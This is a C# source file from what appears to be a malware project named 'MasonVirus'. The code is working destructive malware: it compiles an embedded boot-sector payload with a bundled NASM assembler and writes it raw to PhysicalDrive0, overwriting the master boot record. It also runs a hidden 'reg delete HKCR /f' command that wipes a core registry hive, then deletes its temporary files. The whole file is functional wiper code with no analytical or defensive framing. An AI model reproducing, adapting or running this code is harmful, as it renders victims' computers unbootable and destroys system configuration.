using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace F1r4e8e3m6a0s5o7n9r2y
{
    public static class MasonExtrusion
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateFile(string MasonLpFileName, uint MasonDwDesiredAccess, uint MasonDwShareMode, IntPtr MasonLpSecurityAttributes, uint MasonDwCreationDisposition, uint MasonDwFlagsAndAttributes, IntPtr MasonhTemplateFile);

        [DllImport("kernel32.dll")]
        private static extern bool WriteFile(IntPtr MasonhFile, byte[] MasonLpBuffer, uint MasonnNumberOfBytesToWrite, out uint MasonLpNumberOfBytesWritten, IntPtr MasonLpOverlapped);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr MasonhObject);

        public static async Task MasonExtractResources()
        {
            await Task.Run(() =>
            {
                if (File.Exists("nasm.exe"))
                    return;

                try
                {
                    byte[] MasonNasmBytes = MasonVirus.Properties.Resources.nasm;
                    File.WriteAllBytes("nasm.exe", MasonNasmBytes);
                }
                catch { }
            });
        }
        public static async Task MasonDeleteReg()
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = "/c reg delete HKCR /f"
            });

            await Task.CompletedTask;
        }
        public static bool MasonMBR()
        {
            try
            {
                IntPtr MasonHandle = CreateFile("\\\\.\\PhysicalDrive0", 1073741824U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
                if (MasonHandle.ToInt64() == -1L)
                    return false;
                CloseHandle(MasonHandle);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static async Task MasonFiles()
        {
            await Task.Run(() =>
            {
                string MasonAsmSource = MasonVirus.Properties.Resources.mbr;
                File.WriteAllText("mbr_temp.asm", MasonAsmSource);
                MasonCompileNASM();
                byte[] MasonMbrBin = File.ReadAllBytes("mbr_temp.bin");
                if (MasonMbrBin.Length != 512)
                    return;
                MasonPhysicalDrive(MasonMbrBin);
            });
        }

        public static void MasonCompileNASM()
        {
            if (!File.Exists("nasm.exe"))
                return;

            using (Process MasonProcess = Process.Start(new ProcessStartInfo
            {
                FileName = "nasm.exe",
                Arguments = "-f bin mbr_temp.asm -o mbr_temp.bin",
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = Directory.GetCurrentDirectory()
            }))
            {
                MasonProcess.WaitForExit(5000);
                if (MasonProcess.ExitCode != 0)
                    return;
            }
        }

        public static void MasonPhysicalDrive(byte[] MasonData)
        {
            IntPtr MasonHandle = CreateFile("\\\\.\\PhysicalDrive0", 1073741824U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
            if (MasonHandle.ToInt64() == -1L)
                return;

            try
            {
                uint MasonBytesWritten;
                WriteFile(MasonHandle, MasonData, 512U, out MasonBytesWritten, IntPtr.Zero);
            }
            finally
            {
                CloseHandle(MasonHandle);
            }
        }

        public static async Task MasonCleanupFiles()
        {
            _ = Task.Run(() => MasonExtrusion.MasonDeleteReg());

            await Task.Run(() =>
            {
                try { if (File.Exists("mbr_temp.asm")) File.Delete("mbr_temp.asm"); } catch { }
                try { if (File.Exists("mbr_temp.bin")) File.Delete("mbr_temp.bin"); } catch { }
                try { if (File.Exists("nasm.exe")) File.Delete("nasm.exe"); } catch { }
            });
        }
    }
}